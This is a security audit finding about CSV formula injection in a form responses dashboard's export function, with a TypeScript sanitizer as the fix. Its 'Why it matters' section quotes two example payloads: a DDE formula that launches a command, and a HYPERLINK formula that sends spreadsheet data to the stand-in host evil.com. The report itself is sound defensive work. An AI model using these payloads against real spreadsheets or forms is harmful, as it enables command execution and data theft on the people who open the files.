# Issue: CSV Formula Injection (Spreadsheet Command Execution) in Export

**Severity**: HIGH  
**Category**: Security & Data Integrity  
**File and line**: `components/responses/responses-dashboard.tsx:181-186`

### What is wrong
The CSV export feature serializes user responses into CSV lines by simply wrapping string values in quotes:
```typescript
row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')
```
It does not sanitize formula trigger characters (`=`, `+`, `-`, `@`, `\t`, `\r`) at the start of cell values.

### Why it matters
In spreadsheet applications (such as Microsoft Excel, LibreOffice Calc, and Google Sheets), any cell beginning with `=`, `+`, `-`, or `@` is interpreted as an executable formula. If a respondent inputs `=cmd|' /C calc'!A0` or `=HYPERLINK("http://evil.com/leak?data="&A1,"Click here")`, the spreadsheet executes the command or exfiltrates confidential spreadsheet data when the form creator opens the CSV.

### Concrete recommended fix
Sanitize all cell values before serializing to CSV. If any string starts with formula trigger characters, prepend a single quote (`'`) to ensure spreadsheet applications treat the content strictly as text:
```typescript
function sanitizeForCSV(value: unknown): string {
  const str = String(value ?? '')
  if (/^[=+\-@\t\r]/.test(str)) {
    return `"'${str.replace(/"/g, '""')}"`
  }
  return `"${str.replace(/"/g, '""')}"`
}
```
Apply this sanitizer to all header and data cells during CSV construction.
